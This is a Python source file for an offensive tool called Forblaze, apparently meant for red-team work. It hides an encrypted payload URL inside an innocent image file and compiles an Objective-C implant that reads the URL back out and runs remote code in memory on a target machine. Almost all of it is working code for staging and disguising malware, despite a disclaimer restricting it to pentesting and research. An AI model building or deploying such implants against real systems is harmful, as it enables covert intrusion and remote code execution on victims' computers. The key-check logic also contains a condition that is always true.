#!/usr/bin/python
#Written by AsaurusRex, DO NOT use this project for purposes other than legitimate red teaming/pentesting jobs, or research.  DO NOT use this for illegal activity of any kind, and know that this project is intended for research purposes and to help advance the missions of both red and blue teams.
import sys
import secrets 
import argparse
import subprocess
import time

#encryption piece
def gen_key(length_of_key):
    key = secrets.token_bytes(length_of_key) #generate x random bytes
    bad_byte = False

    if b"\xff" or b"\x00" in key: #we want to move the bytes by at least 1
        bad_byte = True
    
    while(bad_byte == True): #make sure \xff is not in key, or it will shift byte back to itself, which we don't want
        key = secrets.token_bytes(length_of_key) #generate x random bytes
        bad_byte = False

        if b"\xff" in key:
            bad_byte = True

    hex_key = ""
    for i in range(len(key)):
        if len(hex(key[i])) == 3:
            byte = hex(key[i])
            byte = byte.replace("0x", "\\x0")
            hex_key += byte
        else:

            hex_key += hex(key[i])
    
    hex_key = hex_key.replace("0x", "\\x")

    
    #print("Successfully generated key: ", hex_key, "\n", key)

    
    return key, hex_key

def encrypt_string(string, key):
    encrypted_bytes = b""
    string_bytes = string.encode('utf-8')

    keylen = len(key) #number of bytes in the key

    for i in range(len(string_bytes)): 
        if  i < keylen:
            byte = string_bytes[i] #get a piece out of our list
            
           
            new_byte = byte + key[i]
            
            if new_byte > 255: #exists outside of hex range, so need to move it back into range
                new_byte = bytes([new_byte - 256])
                encrypted_bytes += new_byte

            else:
                new_byte = bytes([new_byte])
                encrypted_bytes += new_byte

        else: #we need to do modular arithmetic here to get a new index for the keylen that does not exceed its length
            index = i % keylen
            byte = string_bytes[i]
            
            new_byte = byte + key[index]

            if new_byte > 255: #exists outside of hex range, so need to move it back into range
                new_byte = bytes([new_byte - 256])
                encrypted_bytes += new_byte

            else:
                new_byte = bytes([new_byte])
                encrypted_bytes += new_byte    

    #present the encrypted_bytes in a readable format
    hex_bytes = ""
    for i in range(len(encrypted_bytes)):
        if len(hex(encrypted_bytes[i])) == 3:
            byte = hex(encrypted_bytes[i])
            byte = byte.replace("0x", "\\x0")
            hex_bytes += byte
        else:

            hex_bytes += hex(encrypted_bytes[i])
    
    hex_bytes = hex_bytes.replace("0x", "\\x")

    #print(hex_bytes)
    
    return encrypted_bytes, hex_bytes

def create_stego(innocent_path, encrypted_bytes, output):

    with open(innocent_path, 'rb') as f:
        innocent_content = f.read() #get bytes of innocent file
    
    random_int1 = secrets.randbelow(1000) #create random int below 1000.  These will be the number of padding bytes.

    random_bytes1 = secrets.token_bytes(random_int1)

    random_int2 = secrets.randbelow(1000) #create random int below 1000.  These will be the number of padding bytes.

    random_bytes2 = secrets.token_bytes(random_int2)

    #NOTE: These bytes can be anything you want, but IF you change them make sure to also change lines under assemble_m_file which automatically put them in compile file!!!!
    header_bytes = b"\x59\x59\x59\x59\x59" #bytes denoting the beginning of your desired bytes
    if header_bytes[0] == encrypted_bytes[0]: #make sure no overlap of encrypted and header bytes
        header_bytes = b"\x4e\x4e\x4e\x4e\x4e"

    trailing_bytes = b"\xab\xab\xab\xab\xab" #bytes at the end of your desired bytes 
    if trailing_bytes[0] == encrypted_bytes[-1]: #make sure no overlap of encrypted and trailing bytes
        trailing_bytes = b"\x97\x97\x97\x97\x97"

    
    #craft the stego file
    manipulated_bytes = innocent_content + random_bytes1 + header_bytes + encrypted_bytes + trailing_bytes + random_bytes2

    total_size_file = len(manipulated_bytes)
    with open(output, 'wb') as out:
        out.write(manipulated_bytes)

    #just in case we need it later
    return total_size_file


def assemble_m_file(compile_file, hex_key, stego_location):

    with open(compile_file, 'r+') as f:
        lines = f.readlines()
        for x in range(0, len(lines)):
            if "key here:" in lines[x]:
                lines[x+1] = "unsigned char* key = \"{}\";\n".format(hex_key)
            if "size_key here:" in lines[x]:
                lines[x+1] = "int size_key = {};\n".format(len(hex_key)/4)
            if "stego file location:" in lines[x]:
                lines[x+1] = "NSString *file = [NSString stringWithFormat:@\"{}\"];\n".format(stego_location)

                #can change the header offset bytes here
            if "place header offset bytes here:" in lines[x]:
                lines[x+2] = "unsigned char header1[1] = { 0x59 };\n" 
                lines[x+3] = "unsigned char header2[1] = { 0x4e };\n"

                #can change trailing offset bytes here
            if "place trail offset bytes here:" in lines[x]:
                lines[x+2]= "unsigned char tail1[1] = { 0xab };\n"
                lines[x+3] = "unsigned char tail2[1] = { 0x97 };\n"
               
    with open(compile_file, 'w+') as f:
        f.writelines( lines )
        f.close()
    return True

def compile_forblaze(compile_file, compiled_binary_name):
    
    try:
        cmd = "clang -Wl -s -fmodules {0} -o {1}".format(compile_file, compiled_binary_name)
        stdout = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=False)
        time.sleep(1) #give time for file to compile

    except ValueError:
        print("Error with compilation: ", ValueError)
        sys.exit()

    return True


    #  MAIN FUNCTION STARTS HERE 
def main(innocent_path, output, compile_file, url, length_key, supplied_key, stego_location, compiled_binary_name):
    print("****Beginning Forblaze****")

    if supplied_key != "":
        
        print("Using supplied key {0} of length {1} bytes.".format(supplied_key, int(len(supplied_key)/4)))
        temp_key = supplied_key.replace('\\x', ' ')
        key_bytes = bytearray.fromhex(temp_key)
        
        #print(key_bytes, len(key_bytes))
        print("Encrypting bytes...")
        encrypted_bytes, hex_bytes = encrypt_string(url, key_bytes)
        print("Successfully encrypted bytes, your encrypted {0} bytes are: {1}".format(len(encrypted_bytes), hex_bytes))

        print("Placing encrypted bytes inside {}...".format(innocent_path))
        size_file = create_stego(innocent_path, encrypted_bytes, output)

        print("Editing {}...".format(compile_file))
        value = assemble_m_file(compile_file, supplied_key, stego_location)

        print("Compiling {}...".format(compiled_binary_name))
        
        value = compile_forblaze(compile_file, compiled_binary_name)
        if value == True:
            print("******Forblaze successful.  Check {0} for the stego file and {1} for the compiled binary!*******".format(output, compiled_binary_name))


    else:
        print("No supplied key, generating key...")
        key_bytes, hex_key = gen_key(length_key)
        print("Successfully generated key of length {0} bytes, {1}".format(length_key, hex_key))

        print("Encrypting bytes...")
        encrypted_bytes, hex_bytes = encrypt_string(url, key_bytes)
        print("Successfully encrypted bytes, your encrypted {0} bytes are: {1}".format(len(encrypted_bytes), hex_bytes))

        print("Placing encrypted bytes inside {}...".format(innocent_path))
        size_file = create_stego(innocent_path, encrypted_bytes, output)

        print("Editing {}...".format(compile_file))
        value = assemble_m_file(compile_file, hex_key, stego_location)
    

        print("Compiling {}...".format(compiled_binary_name))
        
        value = compile_forblaze(compile_file, compiled_binary_name)
        if value == True:
            print("******Forblaze successful.  Check {0} for the stego file and {1} for the compiled binary!*******".format(output, compiled_binary_name))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Generate stego for implants.")
    parser.add_argument('-innocent_path', action='store', dest="path", default="", help="Provide the full path to the innocent file to be used.")
    parser.add_argument('-o', action='store', dest="output", default="stego_file", help="Provide the path where you want your stego file to be placed.")
    parser.add_argument('-len_key', action='store', dest="length_of_key", default=16, help="Provide a positive integer that will be the length of the key in bytes. Default is 16. Must be between 10 and 150 bytes.  You can change this yourself, just be wary that larger key sizes will add bloat to your payload and are not necessarily going to make your encryption stronger")
    parser.add_argument('-compile_file', action='store', dest="compile_file", default="compile_forblaze.m", help="Provide the path to the C++ file you want to edit.")
    parser.add_argument('-url_to_encrypt', action='store', dest="url", default="", help="Provide the URL you want to stick inside the compile file.")
    parser.add_argument('-supply_key', action='store', dest="supplied_key", default="", help="If you wish to use a specific key, provide it here. It must be in the format: -supply_key \"\\\\x6e\\\\x60\\\\x...\" - aka two double slashes are needed between each byte, or else it WILL NOT WORK.")
    parser.add_argument('-stego_location', action='store', dest="stego_location", default="", help="You must provide a location on target where the stego file will reside.  It is wise to follow strict full paths: /Users/<>/Documents/file.jpg for example.")
    parser.add_argument('-compiled_binary', action='store', dest="compiled_binary", default="forblaze", help="Give the name of the compiled binary to extract the URL and run code in memory from the stego file.  The default is forblaze.")
    
    args = parser.parse_args()

    
    if str(args.path) == "":
        print("You have not supplied an innocent file to use for stego!  Please provide something such as: -innocent_path innocent.jpg")
        parser.print_help()
        sys.exit()

    if int(args.length_of_key) < 0:
        print("You cannot supply a negative key length, choose a positive integer.  The default is 16.")
        parser.print_help()
        sys.exit()
    

    elif int(args.length_of_key) < 10 or int(args.length_of_key) > 150:
        print("You cannot supply a key length less than 10 or greater than 150 bytes.  You can change this yourself, just be wary that larger key sizes will add bloat to your payload and are not necessarily going to make your encryption stronger.")
        parser.print_help()
        sys.exit()

    if str(args.url) == "":
        print("You have not supplied a URL to embed in the stego file!  Please provide something such as: -url_to_encrypt https://example.com/payload.file")
        parser.print_help()
        sys.exit()
    
    if str(args.stego_location) == "":
        print("You have not supplied a path where the stego file will live on target disk.")
        parser.print_help()
        sys.exit()


    main(str(args.path), str(args.output), str(args.compile_file), str(args.url), int(args.length_of_key), str(args.supplied_key), str(args.stego_location), str(args.compiled_binary))
